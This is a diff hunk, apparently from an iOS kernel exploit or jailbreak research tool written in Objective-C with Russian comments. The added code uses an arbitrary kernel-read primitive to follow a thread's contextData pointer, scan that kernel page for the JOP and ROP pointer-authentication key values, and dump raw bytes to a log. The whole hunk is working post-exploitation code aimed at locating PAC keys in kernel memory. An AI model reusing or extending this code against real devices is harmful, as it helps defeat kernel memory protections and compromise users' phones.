@@ -5173,6 +5173,28 @@ static void *kpParkWorker(void *arg)
                 if (kp_rc_kread64(a) == jop) { [hits appendFormat:@" tro%+#llx", a - tro]; nh++; }
             if (!nh) [hits appendString:@" НИГДЕ в страницах thread_t/thread_ro"];
             pacnote(hits);
+
+            // contextData: отсюда ядро грузит ключи в CPU при context switch
+            uint64_t cdata = kp_untag_ptr(kp_rc_kread64(threadVA + 0xF8));
+            int tCd = kpVAType(cdata, ftbl);
+            pacnote([NSString stringWithFormat:@"  machine.contextData=%#llx type=0x%x", cdata, tCd]);
+            if (kpLooksLikeKernelPointer(cdata)) {
+                NSMutableString *cd = [NSMutableString stringWithString:@"  contextData scan:"];
+                int nc = 0;
+                uint64_t pgC = cdata & ~0x3FFFULL;
+                for (uint64_t a = pgC; a < pgC + 0x4000 && nc < 24; a += 8) {
+                    uint64_t v = kp_rc_kread64(a);
+                    if (v == jop) { [cd appendFormat:@" JOP@%+#llx", a - cdata]; nc++; }
+                    else if (v == kp_rc_kread64(threadVA + 0x1B0)) { [cd appendFormat:@" ROP@%+#llx", a - cdata]; nc++; }
+                }
+                if (!nc) [cd appendString:@" ключи из thread_t тут не встречаются"];
+                pacnote(cd);
+                // дамп первых 0x80 байт contextData — глазами видим ключевой блок
+                NSMutableString *dumpC = [NSMutableString stringWithString:@"  cdata dump:"];
+                for (uint32_t o = 0; o < 0x80; o += 8)
+                    [dumpC appendFormat:@" +%#x=%#llx", o, kp_rc_kread64(cdata + o)];
+                pacnote(dumpC);
+            }
         }
     }
     return r;
